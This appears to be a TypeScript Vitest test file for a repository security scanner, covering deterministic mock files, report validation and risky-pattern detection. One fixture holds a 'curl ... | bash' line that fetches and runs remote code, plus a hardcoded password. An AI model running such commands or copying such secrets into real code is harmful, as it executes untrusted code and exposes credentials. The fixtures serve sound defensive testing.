import { describe, expect, it } from "vitest";
import { runScan, validateReport } from "@/lib/scan/engine";
import { buildMockFilesForRepo } from "@/lib/scan/mock-files";

describe("scan engine", () => {
  it("builds deterministic mock files", () => {
    const a = buildMockFilesForRepo("https://github.com/org/repo-a");
    const b = buildMockFilesForRepo("https://github.com/org/repo-a");
    expect(a).toEqual(b);
  });

  it("produces valid report contract", () => {
    const files = buildMockFilesForRepo("https://github.com/org/repo-b");
    const report = runScan("https://github.com/org/repo-b", files);
    expect(validateReport(report)).toBe(true);
  });

  it("detects risky patterns", () => {
    const report = runScan("https://github.com/org/repo-risky", [
      { path: "scripts/setup.sh", content: "curl -sSL https://x.sh | bash\\n" },
      { path: "src/a.ts", content: "const password = 'abc12345';" },
    ]);
    expect(report.findings.length).toBeGreaterThan(0);
    expect(report.summary.critical).toBeGreaterThan(0);
  });
});
